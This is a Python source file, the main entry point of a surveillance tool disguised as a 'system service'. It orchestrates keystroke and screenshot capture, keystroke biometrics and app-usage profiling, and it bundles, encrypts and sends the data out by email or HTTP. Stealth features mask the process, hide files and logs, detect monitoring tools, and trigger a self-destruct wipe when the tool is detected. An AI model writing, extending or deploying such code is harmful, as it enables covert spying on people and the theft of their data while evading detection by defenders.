"""
System service — Main entry point.

Handles argument parsing, config loading, logging setup,
and orchestrates the capture-report lifecycle.

Usage:
    python main.py                          # Run with defaults
    python main.py -c my_config.yaml        # Custom config
    python main.py --log-level DEBUG        # Verbose logging
    python main.py --list-captures          # Show available capture plugins
    python main.py --list-transports        # Show available transport plugins
"""

from __future__ import annotations

import argparse
import base64
import contextlib
import io
import json
import logging
import os
import sys
import threading
import time
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from capture import create_enabled_captures, list_captures
from config.settings import Settings
from pipeline import Pipeline
from engine.rule_engine import RuleEngine
from engine.event_bus import EventBus
from biometrics.analyzer import BiometricsAnalyzer
from profiler import AppCategorizer, AppUsageTracker, ProductivityScorer
from storage.manager import StorageManager
from storage.sqlite_storage import SQLiteStorage
from transport import create_transport, list_transports
from service import ServiceManager
from utils.compression import gzip_data
from crypto.protocol import E2EProtocol
from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
from utils.logger_setup import setup_logging
from utils.process import GracefulShutdown, PIDLock
from utils.resilience import CircuitBreaker, TransportQueue
from utils.dependency_check import check_and_install_dependencies
from utils.self_destruct import execute_self_destruct
from utils.system_info import get_system_info
from stealth import StealthManager

# Plugin modules are auto-imported by capture/__init__.py and
# transport/__init__.py via their self-registration loops.
# No explicit imports needed here.

logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    # Use innocuous prog name — overridden at runtime by stealth if enabled
    parser = argparse.ArgumentParser(
        prog="system_service",
        description="System monitoring service.",
    )
    subparsers = parser.add_subparsers(dest="command")
    service_parser = subparsers.add_parser("service", help="Manage service/daemon mode")
    service_parser.add_argument(
        "action",
        choices=["install", "uninstall", "start", "stop", "restart", "status"],
        help="Service action to perform",
    )
    parser.add_argument(
        "-c",
        "--config",
        type=str,
        default=None,
        help="Path to YAML config file (overrides defaults)",
    )
    parser.add_argument(
        "--log-level",
        type=str,
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        default=None,
        help="Override log level from config",
    )
    parser.add_argument(
        "--no-pid-lock",
        action="store_true",
        help="Disable PID lock (allow multiple instances)",
    )
    parser.add_argument(
        "--list-captures",
        action="store_true",
        help="List registered capture plugins and exit",
    )
    parser.add_argument(
        "--list-transports",
        action="store_true",
        help="List registered transport plugins and exit",
    )
    parser.add_argument(
        "--self-destruct",
        action="store_true",
        help="Remove all data, logs, and traces then exit",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Start captures but don't send any data",
    )
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s 0.1.0",
    )
    return parser.parse_args()


def _serialize_for_storage(value: Any) -> str:
    if isinstance(value, (dict, list)):
        return json.dumps(value)
    if isinstance(value, bytes):
        return base64.b64encode(value).decode("utf-8")
    return str(value)


def _to_jsonable(value: Any) -> Any:
    if isinstance(value, (dict, list, str, int, float, bool)) or value is None:
        return value
    if isinstance(value, bytes):
        return {"_type": "bytes", "base64": base64.b64encode(value).decode("utf-8")}
    return str(value)


def _zip_bundle(records_json: bytes, file_paths: list[str], compress: bool) -> bytes:
    compression = zipfile.ZIP_DEFLATED if compress else zipfile.ZIP_STORED
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression) as zf:
        zf.writestr("records.json", records_json)
        seen: set[str] = set()
        for idx, filepath in enumerate(file_paths):
            path = Path(filepath)
            if path.exists() and path.is_file():
                arcname = path.name
                if arcname in seen:
                    arcname = f"{idx}_{arcname}"
                seen.add(arcname)
                zf.write(str(path), arcname=arcname)
            else:
                logger.warning("Missing attachment, skipping: %s", filepath)
    return buffer.getvalue()


def _build_report_bundle(
    items: list[dict[str, Any]],
    config: dict[str, Any],
    sys_info: dict[str, str],
) -> tuple[bytes, dict[str, str], list[str]]:
    records = []
    file_paths: list[str] = []

    for item in items:
        record = {
            "type": item.get("type", "unknown"),
            "timestamp": item.get("timestamp"),
            "data": _to_jsonable(item.get("data")),
        }
        file_path = item.get("path") or item.get("file_path")
        if file_path:
            record["path"] = file_path
            file_paths.append(file_path)
        if "size" in item:
            record["size"] = item.get("size")
        records.append(record)

    payload = {
        "system": sys_info,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "records": records,
    }
    records_json = json.dumps(payload, indent=2, ensure_ascii=True).encode("utf-8")

    compression_cfg = config.get("compression", {})
    compress_enabled = bool(compression_cfg.get("enabled", True))
    fmt = str(compression_cfg.get("format", "zip")).lower()
    # Include microseconds to avoid filename collisions when multiple batches
    # are generated within the same second (e.g., small report_interval)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")

    if compress_enabled:
        if fmt == "gzip":
            if file_paths:
                zipped = _zip_bundle(records_json, file_paths, compress=True)
                data = gzip_data(zipped)
                filename = f"report_{timestamp}.zip.gz"
            else:
                data = gzip_data(records_json)
                filename = f"report_{timestamp}.json.gz"
            meta = {"filename": filename, "content_type": "application/gzip"}
            return data, meta, file_paths

        data = _zip_bundle(records_json, file_paths, compress=True)
        filename = f"report_{timestamp}.zip"
        meta = {"filename": filename, "content_type": "application/zip"}
        return data, meta, file_paths

    if file_paths:
        data = _zip_bundle(records_json, file_paths, compress=False)
        filename = f"report_{timestamp}.zip"
        meta = {"filename": filename, "content_type": "application/zip"}
        return data, meta, file_paths

    filename = f"report_{timestamp}.json"
    meta = {"filename": filename, "content_type": "application/json"}
    return records_json, meta, file_paths


def _load_encryption_key(config: dict[str, Any], data_dir: str) -> bytes:
    enc_cfg = config.get("encryption", {})
    key_b64 = enc_cfg.get("key")
    if key_b64:
        return key_from_base64(str(key_b64))

    key = generate_key()
    b64 = key_to_base64(key)

    key_path = Path(data_dir) / "encryption.key"
    fd = os.open(str(key_path), os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0o600)
    try:
        os.write(fd, b64.encode("utf-8"))
    finally:
        os.close(fd)

    enc_cfg["key"] = b64
    logger.warning("Encryption key generated and stored at %s", key_path)
    return key


def _apply_encryption(
    payload: bytes,
    metadata: dict[str, str],
    config: dict[str, Any],
    data_dir: str,
    e2e_protocol: E2EProtocol | None = None,
) -> tuple[bytes, dict[str, str]]:
    enc_cfg = config.get("encryption", {})
    if not enc_cfg.get("enabled", False):
        return payload, metadata

    mode = str(enc_cfg.get("mode", "symmetric")).lower()
    if mode == "e2e":
        if e2e_protocol is None:
            e2e_protocol = E2EProtocol(enc_cfg.get("e2e", {}))
        encrypted = e2e_protocol.encrypt(payload)
        meta = dict(metadata)
        meta["filename"] = f"{meta.get('filename', 'report.bin')}.e2e"
        meta["content_type"] = "application/json"
        return encrypted, meta

    key = _load_encryption_key(config, data_dir)
    encrypted = encrypt(payload, key)
    meta = dict(metadata)
    meta["filename"] = f"{meta.get('filename', 'report.bin')}.enc"
    meta["content_type"] = "application/octet-stream"
    return encrypted, meta


def _cleanup_files(file_paths: list[str]) -> None:
    for filepath in file_paths:
        try:
            path = Path(filepath)
            if path.exists():
                path.unlink()
        except OSError as exc:
            logger.warning("Failed to remove %s: %s", filepath, exc)


def _legacy_sync(
    batch_items: list[dict[str, Any]],
    batch_ids: list[int],
    transport: Any,
    breaker: Any,
    sqlite_store: Any,
    queue: Any,
    storage_manager: Any,
    config: dict[str, Any],
    sys_info: dict[str, Any],
    data_dir: str,
    e2e_protocol: Any,
    args: Any,
) -> None:
    """Original sync path (used when the SyncEngine is disabled)."""
    if not batch_items:
        return

    if hasattr(transport, "preflight"):
        try:
            if not transport.preflight():
                logger.warning("Transport health check failed; skipping send")
                if sqlite_store is None:
                    queue.requeue(batch_items)
                return
        except Exception as exc:
            logger.warning("Transport preflight error: %s", exc)
            if sqlite_store is None:
                queue.requeue(batch_items)
            return

    if args.dry_run:
        logger.info("Dry run: captured %d items", len(batch_items))
        if sqlite_store is None:
            queue.requeue(batch_items)
        return

    if not breaker.can_proceed():
        logger.warning("Circuit open, skipping send")
        if sqlite_store is None:
            queue.requeue(batch_items)
        return

    payload, metadata, file_paths = _build_report_bundle(batch_items, config, sys_info)
    payload, metadata = _apply_encryption(
        payload, metadata, config, data_dir, e2e_protocol=e2e_protocol
    )

    try:
        success = transport.send(payload, metadata)
    except Exception as exc:
        logger.error("Transport send failed: %s", exc)
        success = False

    if success:
        breaker.record_success()
        if sqlite_store is not None:
            sqlite_store.mark_sent(batch_ids)
            purge_age = config.get("storage", {}).get("purge_sent_after_seconds", 86400)
            sqlite_store.purge_sent(older_than_seconds=purge_age)
        _cleanup_files(file_paths)
        storage_manager.rotate()
    else:
        breaker.record_failure()
        if sqlite_store is None:
            queue.requeue(batch_items)


def _items_from_sqlite(rows: list[dict[str, Any]]) -> tuple[list[dict[str, Any]], list[int]]:
    items = []
    ids: list[int] = []
    for row in rows:
        ids.append(int(row["id"]))
        item: dict[str, Any] = {
            "type": row.get("type"),
            "data": row.get("data"),
            "path": row.get("file_path"),
            "timestamp": row.get("timestamp"),
        }
        # Include file_size as "size" so _build_report_bundle can use it
        file_size = row.get("file_size")
        if file_size is not None:
            item["size"] = file_size
        items.append(item)
    return items, ids


def _needs_sqlite_for_routes(config: dict[str, Any]) -> bool:
    pipeline_cfg = config.get("pipeline", {}) if isinstance(config, dict) else {}
    if not pipeline_cfg.get("enabled", False):
        return False
    middleware_cfgs = pipeline_cfg.get("middleware", [])
    for entry in middleware_cfgs:
        if not isinstance(entry, dict):
            continue
        if entry.get("name") != "conditional_router":
            continue
        if not entry.get("enabled", True):
            continue
        routes = (entry.get("config") or {}).get("routes", {})
        if "sqlite" in routes.values():
            return True
    return False


def main() -> int:
    """Main application entry point. Returns exit code."""

    args = parse_args()

    # --- Load config ---
    settings = Settings(args.config)

    # --- Stealth manager (early init, before logging) ---
    stealth_cfg = settings.as_dict().get("stealth", {}) if isinstance(settings.as_dict(), dict) else {}
    stealth = StealthManager(stealth_cfg)

    # --- Setup logging ---
    log_level = args.log_level or settings.get("general.log_level", "INFO")
    log_file = settings.get("general.log_file")
    # In stealth mode, the log controller may override file/console logging
    if stealth.enabled:
        stealth_log_file = stealth.fs_cloak.get_log_file()
        if stealth_log_file == "":
            log_file = None  # suppress file logging
        else:
            log_file = stealth_log_file
    setup_logging(log_level=log_level, log_file=log_file)

    # Activate stealth (process masking, fs cloak, log control, detection)
    if stealth.enabled:
        stealth.activate()

    logger.info("Service starting...")

    # --- Auto-install missing dependencies ---
    if settings.get("general.auto_install_deps", False):
        _installed, _failed = check_and_install_dependencies(auto_install=True)
        if _installed:
            logger.info("Auto-installed packages: %s", ", ".join(_installed))

    # --- Service management ---
    if args.command == "service":
        manager = ServiceManager(settings.as_dict())
        action = getattr(args, "action", "")
        if action == "install":
            print(manager.install())
        elif action == "uninstall":
            print(manager.uninstall())
        elif action == "start":
            print(manager.start())
        elif action == "stop":
            print(manager.stop())
        elif action == "restart":
            print(manager.restart())
        elif action == "status":
            print(manager.status())
        else:
            print("Unknown service action")
        return 0

    # --- List plugins and exit ---
    if args.list_captures:
        captures = list_captures()
        if captures:
            print("Registered capture plugins:")
            for name in captures:
                print(f"  - {name}")
        else:
            print("No capture plugins registered.")
            print("Hint: Import capture modules to register them.")
        return 0

    if args.list_transports:
        transports = list_transports()
        if transports:
            print("Registered transport plugins:")
            for name in transports:
                print(f"  - {name}")
        else:
            print("No transport plugins registered.")
            print("Hint: Import transport modules to register them.")
        return 0

    # --- Self-destruct ---
    if args.self_destruct:
        sd_config = settings.as_dict()
        sd_cfg = sd_config.get("self_destruct", {})
        secure_wipe = bool(sd_cfg.get("secure_wipe", False))
        remove_svc = bool(sd_cfg.get("remove_service", True))
        remove_prog = bool(sd_cfg.get("remove_program", False))

        confirm = input(
            "WARNING: This will permanently delete ALL data, logs, and traces.\n"
            "Type 'YES' to confirm: "
        )
        if confirm.strip() != "YES":
            print("Aborted.")
            return 0

        execute_self_destruct(
            sd_config,
            secure_wipe=secure_wipe,
            remove_service=remove_svc,
            remove_program=remove_prog,
        )
        print("Self-destruct complete.")
        return 0

    # --- PID lock ---
    pid_lock = None
    if not args.no_pid_lock:
        pid_lock = PIDLock(pid_file=stealth.get_pid_path())
        if not pid_lock.acquire():
            logger.error("Another instance is already running. Use --no-pid-lock to override.")
            return 1

    # --- System info ---
    sys_info = get_system_info()
    if not stealth.should_suppress_banner():
        logger.info(
            "System: %s@%s (%s %s)",
            sys_info["username"],
            sys_info["hostname"],
            sys_info["os"],
            sys_info["os_release"],
        )

    # --- Create config snapshot ---
    config = settings.as_dict()

    # --- Encryption setup ---
    e2e_protocol = None
    enc_cfg = config.get("encryption", {}) if isinstance(config, dict) else {}
    if bool(enc_cfg.get("enabled", False)):
        mode = str(enc_cfg.get("mode", "symmetric")).lower()
        if mode == "e2e":
            e2e_cfg = enc_cfg.get("e2e", {})
            if not str(e2e_cfg.get("server_public_key", "")).strip():
                logger.error(
                    "E2E encryption enabled but encryption.e2e.server_public_key is empty. "
                    "Generate server keys with: python -m server.run --generate-keys"
                )
                return 1
            transport_cfg = config.get("transport", {})
            transport_method = str(transport_cfg.get("method", "email")).lower()
            if transport_method == "http":
                http_url = str(transport_cfg.get("http", {}).get("url", "")).strip()
                if not http_url:
                    logger.error(
                        "E2E encryption with HTTP transport "
                        "enabled but transport.http.url "
                        "is empty. "
                        "Set it to the server /ingest endpoint, e.g. http://localhost:8000/ingest"
                    )
                    return 1
            else:
                logger.warning(
                    "E2E encryption enabled but transport method is '%s'. "
                    "E2E is typically used with HTTP transport pointing to the /ingest endpoint.",
                    transport_method,
                )
            try:
                e2e_protocol = E2EProtocol(e2e_cfg)
                logger.info("E2E encryption enabled")
                if e2e_cfg.get("emit_client_keys", False):
                    keys = e2e_protocol.export_client_keys()
                    logger.info("E2E client signing public key: %s", keys["signing_public_key"])
                    logger.info("E2E client exchange public key: %s", keys["exchange_public_key"])
                client_keys_path = str(e2e_cfg.get("client_keys_path", "")).strip()
                if client_keys_path:
                    e2e_protocol.save_client_keys(client_keys_path)
            except Exception as exc:
                logger.error("Failed to initialize E2E encryption: %s", exc)
                return 1

    # --- Pipeline (optional) ---
    pipeline_enabled = bool(settings.get("pipeline.enabled", False))
    pipeline = Pipeline(config, sys_info) if pipeline_enabled else None

    # --- Biometrics (optional) ---
    biometrics_enabled = bool(settings.get("biometrics.enabled", False))
    biometrics_buffer: list[dict[str, Any]] = []
    biometrics_analyzer = BiometricsAnalyzer(
        profile_id_prefix=str(settings.get("biometrics.profile_id_prefix", "usr")),
        match_threshold=float(settings.get("biometrics.authentication.match_threshold", 50.0)),
        authentication_enabled=bool(settings.get("biometrics.authentication.enabled", False)),
    )
    biometrics_sample_size = int(settings.get("biometrics.sample_size", 500))
    biometrics_store = bool(settings.get("biometrics.store_profiles", True))

    # --- Profiler (optional) ---
    profiler_enabled = bool(settings.get("profiler.enabled", False))
    profiler_tracker = None
    profiler_scorer = None
    profiler_emit_interval = 0
    profiler_last_emit = 0.0
    profiler_store = False
    if profiler_enabled:
        profiler_cfg = config.get("profiler", {}) if isinstance(config, dict) else {}
        categorizer = AppCategorizer(profiler_cfg.get("categories"))
        profiler_tracker = AppUsageTracker(
            categorizer=categorizer,
            idle_gap_seconds=int(profiler_cfg.get("idle_gap_seconds", 300)),
        )
        profiler_scorer = ProductivityScorer(
            focus_min_seconds=int(profiler_cfg.get("focus_min_seconds", 600)),
            productive_categories=list(profiler_cfg.get("productive_categories", ["work"])),
            top_n=int(profiler_cfg.get("top_n", 10)),
        )
        profiler_emit_interval = int(profiler_cfg.get("emit_interval_seconds", 300))
        profiler_last_emit = time.time()
        profiler_store = bool(profiler_cfg.get("store_profiles", True))

    # --- Create capture modules ---
    captures = create_enabled_captures(config)

    if not captures:
        logger.warning("No capture modules enabled in config. Nothing to do.")
        logger.info(
            "Enable captures in your config under 'capture:' section. Available: %s",
            ", ".join(list_captures()) or "(none registered)",
        )
        if pid_lock:
            pid_lock.release()
        return 0

    logger.info("Enabled captures: %s", ", ".join(str(c) for c in captures))

    # --- Event Bus for decoupled event routing ---
    event_bus = EventBus()
    logger.debug("Event bus initialized")

    # --- Rule engine (optional) ---
    rules_enabled = bool(settings.get("rules.enabled", False))
    rule_engine = None

    # --- Wire mouse clicks to screenshot capture (on-demand screenshots) ---
    screenshot_capture = next((cap for cap in captures if hasattr(cap, "take_screenshot")), None)
    if screenshot_capture:
        for cap in captures:
            if hasattr(cap, "set_click_callback"):
                try:
                    cap.set_click_callback(screenshot_capture.take_screenshot)
                    logger.info("Mouse clicks wired to screenshot capture")
                except Exception as exc:
                    logger.warning("Failed to wire mouse capture: %s", exc)

    # --- Storage + transport setup ---
    data_dir = settings.get("general.data_dir", "./data")
    storage_backend = settings.get("storage.backend", "local")
    storage_manager = StorageManager(
        data_dir=data_dir,
        max_size_mb=int(settings.get("storage.max_size_mb", 500)),
        rotation=bool(settings.get("storage.rotation", True)),
    )
    sqlite_store = None
    sqlite_needed = storage_backend == "sqlite" or _needs_sqlite_for_routes(config)
    if sqlite_needed:
        sqlite_store = SQLiteStorage(settings.get("storage.sqlite_path", "./data/captures.db"))

    transport = create_transport(config)
    # Patch transport with stealth network bridge (headers, UA, throttling)
    stealth.patch_transport(transport)
    batch_size = int(settings.get("transport.batch_size", 50))

    queue = TransportQueue(max_size=int(settings.get("transport.queue_size", 1000)))
    breaker = CircuitBreaker(
        failure_threshold=int(settings.get("transport.failure_threshold", 5)),
        cooldown=float(settings.get("transport.cooldown", 60)),
    )

    # --- Sync engine (offline-first) ---
    sync_engine = None
    if config.get("sync", {}).get("enabled", False) and sqlite_store is not None:
        try:
            from sync import SyncEngine

            sync_engine = SyncEngine(
                config=config,
                sqlite_store=sqlite_store,
                transport=transport,
                build_payload=_build_report_bundle,
                apply_encryption=_apply_encryption,
                sys_info=sys_info,
                e2e_protocol=e2e_protocol if "e2e_protocol" in dir() else None,
            )
            sync_engine.start()
            logger.info("Sync engine started (mode=%s)", config.get("sync", {}).get("mode", "immediate"))
        except Exception as exc:
            logger.warning("Failed to start sync engine, falling back to basic sync: %s", exc)
            sync_engine = None

    # --- Graceful shutdown handler ---
    shutdown = GracefulShutdown()

    # --- Start all captures ---
    for cap in captures:
        try:
            cap.start()
            logger.info("Started: %s", cap)
        except Exception as e:
            logger.error("Failed to start %s: %s", cap, e)

    # Notify systemd if applicable.
    try:
        from service.linux_systemd import sd_notify

        sd_notify("READY=1")
    except Exception:
        pass

    # --- Main loop ---
    report_interval = settings.get("general.report_interval", 30)
    report_interval_ref = {"value": float(report_interval)}

    def _set_report_interval(value: float) -> None:
        report_interval_ref["value"] = max(1.0, float(value))

    if rules_enabled:
        rule_engine = RuleEngine(config, captures, _set_report_interval)
        logger.info("Rule engine enabled (rules: %s)", settings.get("rules.path"))

    # --- Subscribe components to EventBus ---
    # Rule engine handles all event types
    if rule_engine is not None:

        def _rule_engine_handler(event: dict[str, Any]) -> None:
            try:
                rule_engine.process_events([event])
            except Exception as exc:
                logger.error("Rule engine handler failed: %s", exc)

        event_bus.subscribe("*", _rule_engine_handler)
        logger.debug("Rule engine subscribed to all events")

    # Biometrics only needs keystroke events
    # Use a mutable container so the closure captures the reference to the container,
    # not the list itself. This prevents the bug where reassigning biometrics_buffer
    # would leave the closure appending to the old list.
    # A lock protects against race conditions when EventBus handlers may be invoked
    # from different threads simultaneously accessing the buffer.
    biometrics_buffer_ref = {"buffer": biometrics_buffer}
    biometrics_lock = threading.Lock()
    if biometrics_enabled:

        def _biometrics_handler(event: dict[str, Any]) -> None:
            if event.get("type") == "keystroke_timing":
                with biometrics_lock:
                    biometrics_buffer_ref["buffer"].append(event)

        event_bus.subscribe("keystroke", _biometrics_handler)
        event_bus.subscribe("keystroke_timing", _biometrics_handler)
        logger.debug("Biometrics subscribed to keystroke events")

    # Profiler tracks window/app events
    if profiler_tracker is not None:

        def _profiler_handler(event: dict[str, Any]) -> None:
            try:
                profiler_tracker.process_batch([event])
            except Exception as exc:
                logger.error("Profiler handler failed: %s", exc)

        event_bus.subscribe("window", _profiler_handler)
        event_bus.subscribe("app_focus", _profiler_handler)
        logger.debug("Profiler subscribed to window events")
    logger.info("Entering main loop (report interval: %ds)", report_interval)

    if args.dry_run:
        logger.info("DRY RUN mode — data will be captured but not sent")

    last_report = 0.0
    try:
        while not shutdown.requested:
            time.sleep(0.2)

            # --- Stealth: detection-awareness response ---
            if stealth.enabled:
                if stealth.detection.should_self_destruct():
                    logger.warning("Stealth: self-destruct triggered by detection")
                    break
                if stealth.detection.should_pause():
                    # Go dormant — sleep longer and skip this iteration
                    stealth.resource_profiler.idle_sleep()
                    continue
                # Enforce CPU ceiling
                stealth.resource_profiler.enforce_cpu_ceiling()

            now = time.time()
            effective_interval = report_interval_ref["value"]
            if stealth.enabled:
                effective_interval = stealth.resource_profiler.jittered_interval(effective_interval)
                # Throttle: double interval when monitoring tools detected
                if stealth.detection.should_throttle():
                    effective_interval *= 2.0
            if now - last_report < effective_interval:
                continue
            last_report = now

            # Collect from all captures
            collected: list[dict[str, Any]] = []
            for cap in captures:
                try:
                    collected.extend(cap.collect())
                except Exception as exc:
                    logger.error("Collect failed for %s: %s", cap, exc)

            if pipeline is not None and collected:
                collected = pipeline.process_batch(collected)

            # Publish events through EventBus for decoupled routing to subscribers
            # (rule_engine, biometrics, profiler are already subscribed above)
            if collected:
                for event in collected:
                    event_type = event.get("type", "unknown")
                    event_bus.publish(event_type, event)

            # Biometrics profile generation (triggered when buffer reaches sample_size)
            # Note: keystroke events are routed to biometrics_buffer via EventBus subscriber
            if biometrics_enabled:
                # Use lock to safely access and modify the buffer
                # This prevents race conditions with the EventBus handler
                sample = None
                with biometrics_lock:
                    current_buffer = biometrics_buffer_ref["buffer"]
                    if len(current_buffer) >= biometrics_sample_size:
                        sample = current_buffer[:biometrics_sample_size]
                        # Mutate the container's buffer reference instead of reassigning
                        # the outer variable, so the closure continues using the same list
                        biometrics_buffer_ref["buffer"] = current_buffer[biometrics_sample_size:]
                # Process outside the lock to avoid holding it during expensive operations
                if sample is not None:
                    try:
                        profile = biometrics_analyzer.generate_profile(sample)
                        if biometrics_store and sqlite_store is not None:
                            try:
                                sqlite_store.insert_profile(profile.to_dict())
                            except Exception as exc:
                                logger.error("Failed to store biometrics profile: %s", exc)
                        profile_event = {
                            "type": "biometrics_profile",
                            "data": profile.to_dict(),
                            "timestamp": time.time(),
                        }
                        if biometrics_store:
                            collected.append(profile_event)
                    except Exception as exc:
                        logger.error("Biometrics analysis failed: %s", exc)

            if profiler_tracker is not None and profiler_scorer is not None:
                if (
                    profiler_emit_interval is not None
                    and now - profiler_last_emit >= profiler_emit_interval
                ):
                    try:
                        profile = profiler_scorer.build_daily_profile(profiler_tracker, now_ts=now)
                        if profile is not None:
                            if profiler_store and sqlite_store is not None:
                                try:
                                    sqlite_store.insert_app_profile(profile.to_dict())
                                except Exception as exc:
                                    logger.error("Failed to store app usage profile: %s", exc)
                            profile_event = {
                                "type": "app_usage_profile",
                                "data": profile.to_dict(),
                                "timestamp": now,
                            }
                            if profiler_store:
                                collected.append(profile_event)
                    except Exception as exc:
                        logger.error("Profiler scoring failed: %s", exc)
                    profiler_last_emit = now

            if sqlite_store is not None:
                if storage_backend == "sqlite":
                    sqlite_items = collected
                    queue_items: list[dict[str, Any]] = []
                else:
                    sqlite_items = [i for i in collected if i.get("route") == "sqlite"]
                    queue_items = [i for i in collected if i.get("route") != "sqlite"]

                for item in sqlite_items:
                    data_value = item.get("data")
                    data_str = _serialize_for_storage(data_value) if data_value is not None else ""
                    file_path = item.get("path") or item.get("file_path") or ""
                    file_size = item.get("size", 0) or 0
                    if file_path and not file_size:
                        try:
                            file_size = Path(file_path).stat().st_size
                        except OSError:
                            file_size = 0
                    sqlite_store.insert(
                        item.get("type", "unknown"),
                        data=data_str,
                        file_path=file_path,
                        file_size=file_size,
                    )

                if queue_items:
                    queue.enqueue_many(queue_items)

                # ── Sync: use SyncEngine if available, else fallback ──
                if sync_engine is not None:
                    # SyncEngine handles batching, retry, checkpointing, and
                    # marking sent internally — single call replaces the old
                    # get_pending → send → mark_sent pipeline.
                    sync_engine.process_pending()
                else:
                    pending_rows = sqlite_store.get_pending(limit=batch_size)
                    batch_items, batch_ids = _items_from_sqlite(pending_rows)
                    if batch_items:
                        _legacy_sync(
                            batch_items, batch_ids, transport, breaker,
                            sqlite_store, queue, storage_manager, config,
                            sys_info, data_dir, e2e_protocol, args,
                        )
            else:
                if collected:
                    queue.enqueue_many(collected)
                batch_items = queue.drain(batch_size=batch_size)
                batch_ids = []

                if batch_items:
                    _legacy_sync(
                        batch_items, batch_ids, transport, breaker,
                        sqlite_store, queue, storage_manager, config,
                        sys_info, data_dir, e2e_protocol, args,
                    )

    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt received")

    # --- Shutdown ---
    logger.info("Shutting down...")

    # Stop stealth subsystems
    if stealth.enabled:
        stealth.stop()

    for cap in captures:
        try:
            cap.stop()
            logger.info("Stopped: %s", cap)
        except Exception as e:
            logger.error("Failed to stop %s: %s", cap, e)

    if pid_lock:
        pid_lock.release()

    if sync_engine is not None:
        try:
            sync_engine.stop()
        except Exception:
            pass

    if sqlite_store is not None:
        sqlite_store.close()

    with contextlib.suppress(Exception):
        transport.disconnect()

    # Handle self-destruct if triggered by detection awareness
    if stealth.enabled and stealth.detection.should_self_destruct():
        sd_config = settings.as_dict()
        execute_self_destruct(sd_config, secure_wipe=True, remove_service=True)

    shutdown.restore()
    logger.info("Service stopped.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
